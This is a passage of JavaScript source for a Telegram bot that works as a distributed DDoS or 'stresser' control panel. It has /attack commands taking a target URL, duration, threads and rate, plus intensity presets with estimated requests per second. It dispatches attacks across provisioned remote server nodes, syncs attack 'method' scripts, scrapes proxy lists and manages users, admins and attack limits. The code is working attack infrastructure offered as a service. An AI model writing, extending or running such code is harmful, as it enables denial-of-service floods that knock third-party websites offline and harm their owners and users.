    hist.length ? `<b>History:</b> ${hist.length} total` : '',
    ``,
    `<b>Intensity presets:</b>`,
    ...available.map(([k, v]) =>
      `${v.emoji} ${v.label}${v.adminOnly ? ' 🔒' : ''} · ${v.threads}T × ${v.rate}R → ~${formatNum(estimateRps(v.threads, v.rate))} RPS`
    ),
    ``,
    `<b>Examples:</b>`,
    `<code>/attack ${m.id} https://target.com 120</code>`,
    `<code>/attack ${m.id} https://target.com 120 16 90</code>`,
  ].filter(Boolean).join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: methodMenu(methodId) });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: methodMenu(methodId) });
}

async function showServers(chatId, editMsgId, userId) {
  const s = serverStats();
  const list = store.servers.get();
  const groups = listGroups();
  const txt = [`📡 <b>Servers</b>`, ``, `🟢 ${s.online} · 🔴 ${s.offline} · ⚔️ ${s.attacking}`];
  if (groups.length) txt.push(`\n🏷 Groups: ${groups.map(g => `<code>${esc(g)}</code>`).join(', ')}`);
  if (isAdmin(userId) && list.length) {
    txt.push('');
    for (const srv of list.slice(0, 20)) {
      const icon = srv.status === 'online' ? '🟢' : srv.status === 'offline' ? '🔴' : '⚪';
      const n = Object.values(store.sessions.get()).filter(x => x.status === 'running' && x.serverId === srv.id).length;
      const grp = srv.group ? ` [${esc(srv.group)}]` : '';
      const env = remoteEnvCache.get(srv.id) || healthCache.get(srv.id)?.env;
      const hw = env ? ` · ${hardwareBadge(env)}` : '';
      const db = depsBadge(srv.id);
      txt.push(`${icon} <b>${esc(srv.name)}</b>${grp}${hw}${db}${n ? ` ⚔️×${n}` : ''}`);
    }
    if (list.length > 20) txt.push(`\n… +${list.length - 20} more`);
  }
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: backMenu() });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: backMenu() });
}

async function showStatus(chatId, editMsgId, userId) {
  const sessions = Object.values(store.sessions.get()).filter(s => s.owner === userId && s.status === 'running');
  const s = serverStats();
  const txt = [`📊 <b>Live Status</b>`, ``, `📡 ${s.online}/${s.total} online · ⚔️ ${s.attacking}`];
  if (!sessions.length) txt.push(`\n📭 <i>No active sessions.</i>`);
  else {
    txt.push('');
    for (const sess of sessions) {
      const elapsed = Math.floor((Date.now() - sess.startedAt) / 1000);
      const remain = Math.max(0, sess.duration - elapsed);
      txt.push(`<code>${sess.id}</code> · ${sess.methodName}${sess.serverName ? ` @ ${esc(sess.serverName)}` : ' (local)'}`);
      txt.push(`  🎯 ${esc(String(sess.target).slice(0, 50))}`);
      txt.push(`  ⏱ ${elapsed}s / ${sess.duration}s · ${remain}s left`);
    }
  }
  const kb = sessions.length
    ? { inline_keyboard: [[btn('🛑 Stop All', 'stop_all_mine', 'danger')], [btn('⬅️ Back', 'menu_main', 'primary')]] }
    : backMenu();
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: kb });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: kb });
}

async function showSessions(chatId, editMsgId, userId) {
  const mine = Object.values(store.sessions.get()).filter(s => s.owner === userId && s.status === 'running');
  if (!mine.length) {
    const txt = `🕹 <b>Sessions</b>\n\n📭 <i>No active sessions.</i>`;
    if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: backMenu() });
    else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: backMenu() });
    return;
  }
  const kb = mine.map(s => [btn(`🛑 ${s.id.slice(-6)} · ${s.methodName}`, `sess_stop_${s.id}`, 'danger')]);
  kb.push([btn('⬅️ Back', 'menu_main', 'primary')]);
  const txt = [`🕹 <b>Sessions (${mine.length})</b>`, '', `<i>Tap to stop</i>`].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showHistory(chatId, editMsgId, userId, page = 1) {
  const all = [...store.history.get()].reverse();
  const { slice, page: p, total, hasNext, hasPrev } = paginate(all, page, 10);
  const txt = [`📜 <b>History</b> (${all.length})`, ''];
  if (!slice.length) txt.push('📭 Empty');
  else {
    for (const h of slice) {
      const when = new Date(h.at).toISOString().slice(5, 16).replace('T', ' ');
      const intLabel = h.intensity ? ` · ${h.intensity}` : '';
      txt.push(`<code>${when}</code> · <b>${esc(h.method)}</b>${intLabel}`);
      txt.push(`  🎯 ${esc(String(h.target).slice(0, 40))} · ⏱${h.duration}s · ${h.ok}/${h.total}`);
    }
  }
  const nav = [];
  if (hasPrev) nav.push(btn('« Prev', `hist_p${p - 1}`, 'primary'));
  nav.push(btn(`${p}/${total || 1}`, 'noop', 'primary'));
  if (hasNext) nav.push(btn('Next »', `hist_p${p + 1}`, 'primary'));
  const kb = [];
  if (nav.length) kb.push(nav);
  kb.push([btn('⬅️ Back', 'menu_main', 'primary')]);
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showMethods(chatId, editMsgId, userId) {
  const user = getUser(userId) || { telegramId: userId };
  const admin = isAdmin(userId);
  const list = admin ? allMethods() : visibleMethodsFor(user);
  const txt = [`📦 <b>Methods</b> (${list.length})`, ''];
  const kb = [];
  for (const m of list) {
    const ok = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
    let icon = '✅';
    if (!m.enabled) icon = '🔴';
    else if (!ok) icon = '❌';
    txt.push(`${m.emoji || '📦'} <b>${m.name}</b> ${icon}${m.builtin ? '' : ' 🔧'}`);
    txt.push(`  <i>${esc(m.desc)}</i>`);
    txt.push(`  <code>${esc(m.example)}</code>`);
    kb.push([btn(`${m.emoji || '📦'} ${m.name}`, `method_${m.id}`, m.enabled && ok ? 'primary' : 'danger')]);
  }
  kb.push([btn('⬅️ Back', 'menu_main', 'primary')]);
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showIntensities(chatId, editMsgId, userId) {
  const nodes = onlineNodeCount();
  const admin = isAdmin(userId);
  const available = Object.entries(INTENSITY).filter(([, v]) => !v.adminOnly || admin);
  const txt = [
    `💥 <b>Intensity Presets</b>`,
    ``,
    `<i>RPS = threads × rate × ${nodes} nodes</i>`,
    ``,
    ...available.map(([k, v]) =>
      `${v.emoji} <b>${v.label}</b>${v.adminOnly ? ' 🔒' : ''} — ${v.threads}T × ${v.rate}R → ~${formatNum(estimateRps(v.threads, v.rate))} RPS`
    ),
    ``,
    admin ? '' : `<i>🔒 = admin only</i>`,
    `<b>How to use:</b>`,
    `• <code>/attack crush URL 120</code> → picker opens`,
    `• <code>/attack crush URL 120 16 90</code> → advanced`,
  ].filter(Boolean).join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: backMenu() });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: backMenu() });
}

/* ══════════════════════════════════════════════════════════════════════════
   ADMIN VIEWS
   ══════════════════════════════════════════════════════════════════════════ */

async function showAdminPanel(chatId, editMsgId, viewerId) {
  const users = Object.values(store.users.get());
  const s = serverStats();
  const running = Object.values(store.sessions.get()).filter(x => x.status === 'running').length;
  const mem = process.memoryUsage();
  const owners = CONFIG.ADMIN_IDS.length;
  const admins = users.filter(u => u.role === 'admin' && !isOwner(u.telegramId)).length;
  const viewer = getUser(viewerId);
  const online = botIsOnline();
  const txt = [
    `${isOwner(viewerId) ? '👑' : '🛡'} <b>${BRAND} Admin</b> <i>${VERSION}</i>`,
    `<i>Viewing as ${roleLabel(viewer || { telegramId: viewerId })}</i>`,
    ``,
    `🏛 Status: ${online ? '🟢 ONLINE' : '🔴 MAINTENANCE'}`,
    `👥 Users: <b>${users.length}</b> (${owners}👑 · ${admins}🛡 · ${users.filter(u => u.role === 'pending').length}⏳)`,
    `📡 Servers: <b>${s.online}/${s.total}</b> online`,
    `📦 Methods: <b>${allMethods().filter(m => m.enabled).length}/${allMethods().length}</b> enabled`,
    `⚔️ Active: <b>${running}</b>`,
    `🌐 Proxies: ${readProxies().length}`,
    `🎯 Presets: ${Object.keys(store.presets.get()).length}`,
    `🧠 Heap: ${(mem.heapUsed / 1048576).toFixed(1)}MB`,
    `🌀 Restarts: ${pollingRestarts}`,
    `📦 Deps: ${REMOTE_DEPS.length}`,
  ].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: adminMenu(viewerId) });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: adminMenu(viewerId) });
}

async function showBotControl(chatId, editMsgId) {
  const st = store.botstate.get();
  const online = st.online !== false;
  const txt = [
    `🤖 <b>Bot Control</b>`,
    ``,
    `Status: ${online ? '🟢 <b>ONLINE</b>' : '🔴 <b>MAINTENANCE MODE</b>'}`,
    ``,
    `<b>Maintenance message:</b>`,
    `<i>${esc(st.maintenanceMsg || '(default)')}</i>`,
    st.lastToggleBy ? `\nLast toggle: <code>${st.lastToggleBy}</code> · ${st.lastToggleAt ? new Date(st.lastToggleAt).toISOString().slice(0, 16).replace('T', ' ') : '?'}` : '',
    ``,
    online
      ? `<i>All users can use the bot normally.</i>`
      : `<i>Only admins can use the bot. Users see maintenance message.</i>`,
  ].filter(Boolean).join('\n');
  const kb = [
    [online
      ? btn('🔴 Turn OFF (Maintenance)', 'botctl_off', 'danger')
      : btn('🟢 Turn ON', 'botctl_on', 'success')
    ],
    [btn('✏️ Edit Message', 'botctl_msg', 'primary')],
    [btn('⬅️ Back', 'menu_admin', 'primary')],
  ];
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminUsers(chatId, editMsgId, page = 1) {
  const all = Object.values(store.users.get());
  const { slice, page: p, total, hasNext, hasPrev } = paginate(all, page, 8);
  const kb = slice.map(u => {
    const icon = roleBadge(u);
    const style = isOwner(u.telegramId) ? 'danger' : (u.role === 'admin' ? 'success' : (u.role === 'user' ? 'success' : 'primary'));
    const label = `${icon} ${u.firstName || u.username || u.telegramId}`;
    return [btn(label, `usr_${u.telegramId}`, style)];
  });
  const nav = [];
  if (hasPrev) nav.push(btn('« Prev', `adm_users_p${p - 1}`, 'primary'));
  nav.push(btn(`${p}/${total || 1}`, 'noop', 'primary'));
  if (hasNext) nav.push(btn('Next »', `adm_users_p${p + 1}`, 'primary'));
  if (nav.length) kb.push(nav);
  kb.push([btn('⬅️ Back', 'menu_admin', 'primary')]);
  const txt = `👥 <b>Users (${all.length})</b>\n\n👑 owner · 🛡 admin · ✅ user · ⏳ pending · 🚫 banned`;
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

function userAccessBadge(u) {
  if (isAdmin(u.telegramId)) return 'all';
  const am = u.allowedMethods;
  if (am === null || am === undefined) return 'all';
  if (Array.isArray(am) && am.length === 0) return '🔒 none';
  return `${am.length} method(s)`;
}

async function showUserActions(chatId, editMsgId, targetId, viewerId) {
  const u = getUser(targetId);
  if (!u) return;
  const l = u.limits || {};
  const viewerIsOwner = isOwner(viewerId);
  const targetIsOwner = isOwner(Number(targetId));
  const targetIsAdmin = u.role === 'admin';
  const viewerIsTarget = String(viewerId) === String(targetId);

  const kb = [];
  if (!targetIsOwner) {
    kb.push([btn('✅ Approve', `approve_${targetId}`, 'success'), btn('🚫 Ban', `ban_${targetId}`, 'danger')]);
  } else {
    kb.push([btn('👑 Owner — protected', 'noop', 'danger')]);
  }
  if (viewerIsOwner && !targetIsOwner && !viewerIsTarget) {
    if (targetIsAdmin) {
      kb.push([btn('⬇️ Revoke Admin', `revokadm_${targetId}`, 'danger')]);
    } else if (u.role !== 'banned') {
      kb.push([btn('⬆️ Make Admin', `makeadm_${targetId}`, 'success')]);
    }
  }
  kb.push([btn(`🔓 Access (${userAccessBadge(u)})`, `uaccess_${targetId}`, 'primary')]);
  kb.push([
    btn(`⏱ Dur (${l.maxDuration || '∞'})`, `setdur_${targetId}`, 'primary'),
    btn(`⚔️ Conc (${l.maxConcurrent || '∞'})`, `setconc_${targetId}`, 'primary'),
  ]);
  if (!targetIsOwner && !viewerIsTarget) {
    kb.push([btn('❌ Delete', `del_${targetId}`, 'danger')]);
  }
  kb.push([btn('⬅️ Back', 'adm_users', 'primary')]);

  const txt = [
    `${roleBadge(u)} <b>${esc(u.firstName || u.username || targetId)}</b>`,
    `ID: <code>${targetId}</code> · Role: <b>${roleLabel(u)}</b>`,
    ``,
    `Duration: ${l.maxDuration || '∞'} · Threads: ${l.maxThreads || '∞'}`,
    `Rate: ${l.maxRate || '∞'} · Concurrent: ${l.maxConcurrent || '∞'}`,
    `Cooldown: ${l.cooldown || 0}s`,
    ``,
    `Access: <b>${userAccessBadge(u)}</b>`,
    `Sessions: ${userActiveCount(Number(targetId))}`,
  ].filter(Boolean).join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showUserAccess(chatId, editMsgId, targetId) {
  const u = getUser(targetId);
  if (!u) return;
  const methods = allMethods();
  const am = u.allowedMethods;
  const allAllowed = (am === null || am === undefined);
  const kb = methods.map(m => {
    const allowed = allAllowed || (Array.isArray(am) && am.includes(m.id));
    const stateIcon = m.enabled ? '' : ' 🔴';
    return [btn(
      `${allowed ? '✅' : '❌'} ${m.emoji || '📦'} ${m.name}${stateIcon}`,
      `uat_${targetId}_${m.id}`,
      allowed ? 'success' : 'danger'
    )];
  });
  kb.push([btn('🟢 All', `uaccessall_${targetId}`, 'success'), btn('🔒 None', `uaccessnone_${targetId}`, 'danger')]);
  kb.push([btn('⬅️ Back', `usr_${targetId}`, 'primary')]);
  const txt = [
    `🔓 <b>Method Access</b>`,
    `👤 ${esc(u.firstName || u.username || targetId)}`,
    ``,
    allAllowed ? '<i>Current: ALL enabled methods</i>' : `<i>Current: ${Array.isArray(am) ? am.length : 0} allowed</i>`,
    ``,
    `<b>Tap to toggle.</b>`,
  ].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminServers(chatId, editMsgId) {
  const list = store.servers.get();
  const kb = list.map(s => {
    const env = remoteEnvCache.get(s.id) || healthCache.get(s.id)?.env;
    const hw = env ? ` · ${hardwareBadge(env)}` : '';
    return [btn(`🖥 ${s.name}${s.group ? ` [${s.group}]` : ''}${hw}`, `srv_${s.id}`, s.status === 'online' ? 'success' : 'danger')];
  });
  kb.push([btn('➕ Add Server', 'addsrv_start', 'primary')]);
  kb.push([btn('🔄 Sync All', 'syncall_methods', 'success')]);
  kb.push([btn('⚡ Provision All', 'provision_all', 'success')]);
  kb.push([btn('📦 Install Deps All', 'deps_all', 'success')]);
  kb.push([btn('⬅️ Back', 'menu_admin', 'primary')]);
  const txt = `🖥 <b>Servers (${list.length})</b>\n\n<i>Format: name [group] · cores · RAM · 📦deps</i>`;
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showServerActions(chatId, editMsgId, serverId) {
  const s = getServer(serverId);
  if (!s) return;
  const n = Object.values(store.sessions.get()).filter(x => x.status === 'running' && x.serverId === serverId).length;
  const env = remoteEnvCache.get(serverId) || healthCache.get(serverId)?.env;
  const deps = remoteDepsCache.get(serverId);

  const hwLines = [];
  if (env) {
    if (env.cores) hwLines.push(`Cores: <b>${env.cores}</b>`);
    if (env.memMB) hwLines.push(`RAM: <b>${formatGB(env.memMB)}</b>`);
    if (env.diskGB) hwLines.push(`Disk: <b>${env.diskGB}G</b>`);
    if (env.arch) hwLines.push(`Arch: <code>${esc(env.arch)}</code>`);
    if (env.nodePath) hwLines.push(`Node: <code>${esc(env.nodePath)}</code> v${esc(env.version || '?')}`);
  }
  hwLines.push(`Deps: ${deps ? (deps.ok ? '✅ all installed' : '❌ ' + (deps.missing || 'unknown')) : '⚪ unchecked'}`);

  const kb = [
    [btn('🔄 Sync Scripts', `srv_sync_${serverId}`, 'primary')],
    [btn('🔍 Health', `srv_health_${serverId}`, 'primary')],
    [btn('⚡ Provision', `srv_provision_${serverId}`, 'success')],
    [btn('📦 Install Deps', `srv_deps_${serverId}`, 'success')],
    [btn('🧪 Diag', `srv_diag_${serverId}`, 'primary')],
    [btn(`🏷 Group (${s.group || 'none'})`, `srv_group_${serverId}`, 'primary')],
    [btn('❌ Delete', `srv_del_${serverId}`, 'danger')],
    [btn('⬅️ Back', 'adm_servers', 'primary')],
  ];
  const txt = [
    `🖥 <b>${esc(s.name)}</b>`,
    `Host: <code>${s.host}:${s.port}</code>`,
    `Status: <b>${s.status}</b> · User: ${esc(s.username)}`,
    ...hwLines,
    `Group: ${s.group ? `<code>${esc(s.group)}</code>` : '—'}`,
    `Sessions: ${n}`,
  ].filter(Boolean).join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminMethods(chatId, editMsgId) {
  const list = allMethods();
  const kb = list.map(m => {
    const ok = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
    const icon = m.enabled ? (ok ? '🟢' : '❌') : '🔴';
    return [btn(`${icon} ${m.emoji || ''} ${m.name}${m.builtin ? '' : ' 🔧'}`, `methodview_${m.id}`, m.enabled ? 'success' : 'danger')];
  });
  kb.push([btn('➕ Add Method', 'addmethod_start', 'success')]);
  kb.push([btn('🟢 Enable All', 'methods_enable_all', 'success'), btn('🔴 Disable All', 'methods_disable_all', 'danger')]);
  kb.push([btn('⬅️ Back', 'menu_admin', 'primary')]);
  const enabledCount = list.filter(m => m.enabled).length;
  const txt = `📦 <b>Methods (${list.length})</b>\n\n🟢 ${enabledCount} enabled · 🔴 ${list.length - enabledCount} disabled`;
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminMethodDetail(chatId, editMsgId, methodId) {
  const m = getMethod(methodId);
  if (!m) return;
  const fileExists = fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file));
  const st = getMethodState(methodId);
  const txt = [
    `${m.emoji || '📦'} <b>${m.name}</b> ${m.enabled ? '🟢' : '🔴'}`,
    `ID: <code>${m.id}</code> · File: <code>${m.file}</code> ${fileExists ? '✅' : '❌'}`,
    `Type: <b>${m.builtin ? 'built-in' : 'custom'}</b>`,
    ``,
    `📝 <i>${esc(m.desc)}</i>`,
    `<b>Example:</b>`,
    `<code>${esc(m.example)}</code>`,
  ];
  if (st.stats?.launches) {
    txt.push('');
    txt.push(`📈 Launches: <b>${st.stats.launches}</b>`);
    if (st.stats.lastAt) txt.push(`Last: ${new Date(st.stats.lastAt).toISOString().slice(0, 16).replace('T', ' ')} · by <code>${st.stats.lastBy}</code>`);
  }
  const kb = [
    [btn(m.enabled ? '🔴 Disable' : '🟢 Enable', `mtoggle_${methodId}`, m.enabled ? 'danger' : 'success')],
  ];
  if (!m.builtin) {
    kb.push([btn('🧪 Test Parse', `method_test_${methodId}`, 'primary')]);
    kb.push([btn('🔄 Re-sync', `method_resync_${methodId}`, 'primary')]);
    kb.push([btn('🗑 Delete', `method_delete_${methodId}`, 'danger')]);
  }
  kb.push([btn('⬅️ Back', 'adm_methods', 'primary')]);
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminProxies(chatId, editMsgId) {
  const p = readProxies();
  const kb = [
    [btn('📁 Upload .txt', 'proxy_upload', 'success')],
    [btn('🔄 Scrape GitHub', 'proxy_scrape', 'primary')],
    [btn('🧪 Health Check', 'proxy_health', 'primary')],
    [btn('📤 Sync All', 'proxy_syncall', 'primary')],
    [btn('🗑 Clear', 'proxy_clear', 'danger')],
    [btn('⬅️ Back', 'menu_admin', 'primary')],
  ];
  const txt = [`🌐 <b>Proxies</b>`, ``, `Total: <b>${p.length}</b>`, ``, `<i>Health check tests 50 random.</i>`].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAdminPresets(chatId, editMsgId) {
  const presets = store.presets.get();
  const list = Object.entries(presets);
  const kb = list.map(([name, p]) => [btn(`🎯 @${name} → ${p.method}`, `preset_${name}`, 'primary')]);
  kb.push([btn('➕ Add Preset', 'preset_add', 'success')]);
  kb.push([btn('⬅️ Back', 'menu_admin', 'primary')]);
  const txt = [`🎯 <b>Presets (${list.length})</b>`, '', '<i>Usage: /attack @name &lt;url&gt; &lt;dur&gt;</i>'].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showPresetDetail(chatId, editMsgId, name) {
  const p = store.presets.get()[name];
  if (!p) return;
  const txt = [
    `🎯 <b>@${esc(name)}</b>`,
    ``,
    `Method: <b>${esc(p.method)}</b>`,
    `Threads: ${p.threads} · Rate: ${p.rate}`,
    ``,
    `<b>Usage:</b>`,
    `<code>/attack @${name} https://example.com 60</code>`,
  ].join('\n');
  const kb = [
    [btn('🗑 Delete', `preset_del_${name}`, 'danger')],
    [btn('⬅️ Back', 'adm_presets', 'primary')],
  ];
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showManageAdmins(chatId, editMsgId) {
  const owners = CONFIG.ADMIN_IDS.map(id => getUser(id) || { telegramId: id, firstName: `Owner#${id}` });
  const promoted = Object.values(store.users.get()).filter(u => u.role === 'admin' && !isOwner(u.telegramId));
  const txt = [
    `👑 <b>Manage Admins</b>`,
    ``,
    `<b>Owners (${owners.length})</b> — from env, cannot be demoted:`,
    ...owners.map(o => `• <code>${o.telegramId}</code> ${esc(o.firstName || o.username || '?')}`),
    ``,
    `<b>Promoted (${promoted.length})</b>:`,
    ...promoted.slice(0, 15).map(p => `• <code>${p.telegramId}</code> ${esc(p.firstName || p.username || '?')}${p.promotedBy ? ` (by ${p.promotedBy})` : ''}`),
    promoted.length > 15 ? `… +${promoted.length - 15} more` : '',
    ``,
    `<i>To promote: Users → tap user → ⬆️ Make Admin.</i>`,
  ].filter(Boolean).join('\n');
  const kb = [
    [btn('👥 Open Users List', 'adm_users', 'primary')],
    [btn('⬅️ Back', 'menu_admin', 'primary')],
  ];
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showAudit(chatId, editMsgId) {
  const lines = tailAudit(20);
  const txt = [`📜 <b>Audit (last 20)</b>`, '', '```'];
  for (const l of lines) {
    try { const o = JSON.parse(l); txt.push(`${o.at.slice(11, 19)} ${o.event} ${o.actor}`); }
    catch { txt.push(l.slice(0, 60)); }
  }
  txt.push('```');
  if (editMsgId) await edit(chatId, editMsgId, txt.join('\n'), { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
  else await bot.sendMessage(chatId, txt.join('\n'), { parse_mode: 'HTML', reply_markup: backMenu('⬅️ Back', 'menu_admin') });
}

/* ══════════════════════════════════════════════════════════════════════════
   ATTACK LAUNCHER
   ══════════════════════════════════════════════════════════════════════════ */

async function runAttack(user, method, parsed, chatId, opts = {}) {
  const allServers = store.servers.get().filter(s => s.status === 'online');
  const servers = opts.group ? allServers.filter(s => s.group === opts.group) : allServers;
  const totalTargets = 1 + servers.length;
  const batchId = newBatchId();

  upsertUser(user.telegramId, { lastMethod: method.id, lastTarget: parsed.target });
  bumpMethodStats(method.id, user.telegramId);

  const intensityLabel = opts.intensity ? INTENSITY[opts.intensity]?.label : null;
  const groupLabel = opts.group ? ` [${opts.group}]` : '';
  const intensityTag = intensityLabel ? ` · ${intensityLabel}` : '';

  const progress = await bot.sendMessage(chatId,
    `${method.emoji || '💥'} <b>Launching ${esc(method.name)}${intensityTag}${esc(groupLabel)}</b>\n` +
    `🎯 <code>${esc(parsed.target)}</code>\n` +
    `⏱ ${parsed.duration}s · ${parsed.threads}T · ${parsed.rate}R\n` +
    `📊 Est. RPS: ~${formatNum((Number(parsed.threads)||0) * (Number(parsed.rate)||0) * totalTargets)}\n\n` +
    `⚡ Dispatching to ${totalTargets} node(s)…`,
    { parse_mode: 'HTML', disable_web_page_preview: true });

  await prewarmServers(servers.map(s => s.id));

  const results = [];
  try { launchLocal(user, method, parsed, batchId); results.push({ ok: true, where: 'local' }); }
  catch (e) { results.push({ ok: false, error: 'local: ' + e.message }); }

  const remotePromises = servers.map(s => new Promise(resolve => {
    attackQueue.push({
      kind: 'remote', serverId: s.id,
      fn: async () => {
        try {
          await launchRemote(user, method, parsed, s.id, batchId, (msg) => {
            bot.sendMessage(chatId, `⚡ ${esc(s.name)}: ${esc(msg)}`).catch(() => {});
          });
          results.push({ ok: true, where: s.name }); resolve(true);
        }
        catch (e) { results.push({ ok: false, error: `${s.name}: ${e.message}` }); resolve(false); }
      },
      onError: e => { results.push({ ok: false, error: e.message }); resolve(false); },
    });
  }));

  await Promise.all(remotePromises);
  const okCount = results.filter(r => r.ok).length;

  store.history.mutate(h => {
    h.push({
      at: Date.now(), method: method.id, target: parsed.target,
      duration: parsed.duration, ok: okCount, total: totalTargets,
      by: user.telegramId, intensity: opts.intensity || 'custom',
    });
    if (h.length > 500) h.splice(0, h.length - 500);
  });

  if (user.limits?.cooldown > 0) setCooldown(user.telegramId, user.limits.cooldown);
  audit('attack_launched', user.telegramId, {
    method: method.id, target: parsed.target,
    ok: okCount, total: totalTargets,
    intensity: opts.intensity || 'custom',
  });

  const s = serverStats();
  const lines = [
    okCount > 0 ? '✅ <b>Attack dispatched</b>' : '❌ <b>Attack failed</b>', '',
    `${method.emoji || '📦'} ${esc(method.name)}${intensityTag}`,
    `🎯 <code>${esc(parsed.target)}</code>`,
    `⏱ ${parsed.duration}s · ${parsed.threads}T · ${parsed.rate}R`,
    `📊 Est. RPS: ~${formatNum((Number(parsed.threads)||0) * (Number(parsed.rate)||0) * totalTargets)}`, '',
    `📡 ${s.online}/${s.total} online · ⚔️ ${s.attacking} attacking`,
    `🎯 Launched: <b>${okCount}</b>/${totalTargets}`,
  ];
  if (okCount < totalTargets) {
    lines.push(`\n⚠️ ${totalTargets - okCount} failed:`);
    results.filter(r => !r.ok).slice(0, 5).forEach(r => lines.push(`• ${esc(r.error)}`));
  }

  await edit(chatId, progress.message_id, lines.join('\n'),
    { reply_markup: { inline_keyboard: [[btn('📊 Status', 'menu_status', 'primary'), btn('🕹 Sessions', 'menu_sessions', 'primary')]] } });

  const checkDone = () => {
    const still = Object.values(store.sessions.get()).filter(x => x.batchId === batchId && x.status === 'running');
    if (still.length === 0) {
      ATTACKS.removeListener('stopped', checkDone);
      bot.sendMessage(chatId, `🏁 <b>Attack finished</b>\n\n${method.emoji} ${esc(method.name)}\n🎯 <code>${esc(parsed.target)}</code>\n⏱ ${parsed.duration}s`,
        { parse_mode: 'HTML', disable_web_page_preview: true }).catch(() => {});
    }
  };
  ATTACKS.on('stopped', checkDone);
  setTimeout(checkDone, parsed.duration * 1000 + 5000);
}

const pendingInput = new Map();

/* ══════════════════════════════════════════════════════════════════════════
   COMMANDS
   ══════════════════════════════════════════════════════════════════════════ */

bot.onText(/^\/start\b/, guardCommand(async msg => { ensureUser(msg); await showMainMenu(msg.chat.id, null, msg.from.id); }));
bot.onText(/^\/menu\b/, guardCommand(async msg => { ensureUser(msg); await showMainMenu(msg.chat.id, null, msg.from.id); }));

bot.onText(/^\/help\b/, guardCommand(async msg => {
  const methods = availableMethods();
  await reply(msg, [
    `<b>${BRAND} — Commands</b>`,
    ``,
    `<b>Attack</b>`,
    `/attack — method picker`,
    `/attack &lt;method&gt; &lt;url&gt; &lt;dur&gt;`,
    `/attack &lt;method&gt; &lt;url&gt; &lt;dur&gt; &lt;threads&gt; &lt;rate&gt;`,
    `/attack @preset &lt;url&gt; &lt;dur&gt;`,
    `/intensities`,
    ``,
    `<b>Methods (${methods.length})</b>`,
    ...methods.map(m => `${m.emoji} <code>${m.id}</code> — ${esc(m.name)}`),
    ``,
    `<b>View</b>`,
    `/methods · /servers · /status · /sessions · /history`,
    `/logs &lt;id&gt; · /me · /health · /admins`,
    ``,
    `<b>Manage</b>`,
    `/stop &lt;id&gt; · /killall · /scrape · /syncmethods`,
    `/provision · /installdeps`,
    ``,
    `Admins: /admin · /broadcast`,
  ].join('\n'));
